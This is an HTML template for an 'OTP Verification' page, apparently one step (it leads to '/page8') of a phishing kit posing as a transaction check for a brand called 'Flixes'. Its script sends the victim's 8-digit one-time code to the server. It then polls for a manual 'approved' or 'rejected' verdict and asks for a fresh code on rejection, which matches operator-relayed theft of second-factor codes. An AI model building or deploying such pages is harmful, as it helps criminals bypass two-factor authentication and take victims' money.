<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0b0e1a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; overflow-x: hidden; }
        .container { max-width: 400px; width: 100%; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); padding: 40px 30px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.08); position: relative; z-index: 1; }
        .container h2 { text-align: center; font-size: 28px; background: linear-gradient(135deg, #00f0ff, #7a2be0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
        .container .sub { text-align: center; color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .notice { background: rgba(255,165,0,0.12); border-left: 4px solid #ffa502; padding: 12px 16px; border-radius: 12px; font-size: 13px; color: #ffa502; margin-bottom: 25px; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 13px; color: #aaa; margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 14px 16px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.04); color: #fff; font-size: 15px; outline: none; transition: 0.3s; text-align: center; letter-spacing: 4px; }
        .form-group input:focus { border-color: #00f0ff; box-shadow: 0 0 20px rgba(0,240,255,0.1); }
        .btn { width: 100%; padding: 16px; border: none; border-radius: 50px; background: linear-gradient(135deg, #00c8ff, #7a2be0); color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 40px rgba(0,200,255,0.3); }
        .msg { text-align: center; margin-top: 15px; font-size: 14px; min-height: 24px; }
        .error { color: #ff4757; }
        .success { color: #2ed573; }
        .pending { color: #ffa502; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #555; }
    </style>
</head>
<body>

{% include 'earth-bg.html' %}

<div class="container">
    <h2>🔐 OTP Verification</h2>
    <div class="sub">Enter the 8-digit OTP sent to your registered device.</div>
    <div class="notice">⚠️ OTP is required to complete your transaction. Do not share with anyone.</div>
    <form id="otpForm">
        <div class="form-group"><label>8-Digit OTP</label><input type="text" id="otpInput" placeholder="12345678" maxlength="8" inputmode="numeric" pattern="[0-9]*" required></div>
        <button type="submit" class="btn">Verify OTP →</button>
    </form>
    <div id="msg" class="msg"></div>
    <div class="footer">© 2026 Flixes — Secure Authentication</div>
</div>

<script>
const otpInput = document.getElementById('otpInput');
const msg = document.getElementById('msg');
otpInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
document.getElementById('otpForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const otp = otpInput.value.trim();
    if (!otp || otp.length !== 8) {
        msg.className = 'msg error';
        msg.textContent = '❌ Please enter a valid 8-digit OTP.';
        return;
    }
    msg.className = 'msg pending';
    msg.textContent = '⏳ Verifying your OTP...';
    const res = await fetch('/submit_otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp })
    });
    const data = await res.json();
    if (data.status === 'invalid') {
        msg.className = 'msg error';
        msg.textContent = '❌ Invalid OTP format. Please try again.';
        otpInput.value = '';
        return;
    }
    let attempts = 0;
    const maxAttempts = 60;
    const interval = setInterval(async () => {
        attempts++;
        const statusRes = await fetch('/check_otp_status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ otp })
        });
        const statusData = await statusRes.json();
        if (statusData.status === 'approved') {
            clearInterval(interval);
            msg.className = 'msg success';
            msg.textContent = '✅ OTP verified! Redirecting...';
            setTimeout(() => window.location.href = '/page8', 1500);
        } else if (statusData.status === 'rejected') {
            clearInterval(interval);
            msg.className = 'msg error';
            msg.textContent = '❌ Your OTP is wrong. Please enter the new OTP.';
            otpInput.value = '';
        } else {
            msg.className = 'msg pending';
            msg.textContent = '⏳ Verifying your OTP...';
        }
        if (attempts >= maxAttempts) {
            clearInterval(interval);
            msg.className = 'msg pending';
            msg.textContent = '⏳ Still verifying... Please wait.';
        }
    }, 1000);
});
</script>
</body>
</html>
